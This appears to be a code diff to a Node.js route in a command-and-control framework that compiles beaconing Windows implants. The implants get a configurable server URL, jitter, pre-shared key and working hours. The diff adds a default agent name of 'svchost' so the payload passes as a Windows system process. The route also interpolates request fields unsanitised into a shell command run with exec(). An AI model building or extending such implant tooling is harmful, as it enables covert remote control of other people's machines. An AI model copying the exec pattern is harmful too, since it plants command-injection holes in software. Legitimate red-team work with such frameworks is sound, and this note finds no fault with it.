@@ -19,20 +19,29 @@ if (!fs.existsSync(PAYLOAD_DIR)) {
 router.post('/generate', verifyToken, async (req, res) => {
   const { 
     serverUrls, 
+    serverUrl,
     showGui, 
     interval = 10, 
     jitter = 15,
     psk,
     discoveryUrl,
+    agentName = 'svchost',
     workHours
   } = req.body;
 
-  if (!serverUrls) {
-    return res.status(400).json({ error: 'Server URLs are required' });
+  const finalUrls = serverUrls || serverUrl;
+
+  if (!finalUrls) {
+    return res.status(400).json({ 
+      error: 'Server URLs are required', 
+      received_keys: Object.keys(req.body) 
+    });
   }
 
   const payloadId = uuidv4();
-  const outputName = `bytecode-agent-${payloadId.slice(0, 8)}.exe`;
+  // Ensure we use the custom name if provided, otherwise a default
+  const baseName = agentName.replace(/[^a-zA-Z0-9_-]/g, '') || 'bytecode-agent';
+  const outputName = `${baseName}-${payloadId.slice(0, 8)}.exe`;
   const outputPath = path.join(PAYLOAD_DIR, outputName);
   
   // Path to the agent source
@@ -43,7 +52,7 @@ router.post('/generate', verifyToken, async (req, res) => {
   const beaconMax = Math.ceil(beaconMin + (beaconMin * (parseInt(jitter) / 100)));
 
   // Construct the go build command
-  let ldflags = `-X 'bytecode-agent/internal/config.DefaultServerURL=${serverUrls}'`;
+  let ldflags = `-X 'bytecode-agent/internal/config.DefaultServerURL=${finalUrls}'`;
   ldflags += ` -X 'bytecode-agent/internal/config.DefaultBeaconMin=${beaconMin}'`;
   ldflags += ` -X 'bytecode-agent/internal/config.DefaultBeaconMax=${beaconMax}'`;
   
@@ -69,7 +78,7 @@ router.post('/generate', verifyToken, async (req, res) => {
 
   const command = `go build -ldflags="${ldflags}" -o "${outputPath}" ./cmd/agent`;
 
-  console.log(`[PAYLOAD] Generating: ${outputName} for ${serverUrl} (GUI: ${showGui})`);
+  console.log(`[PAYLOAD] Generating: ${outputName} for ${finalUrls} (GUI: ${showGui})`);
 
   exec(command, { cwd: agentSourceDir }, (error, stdout, stderr) => {
     if (error) {
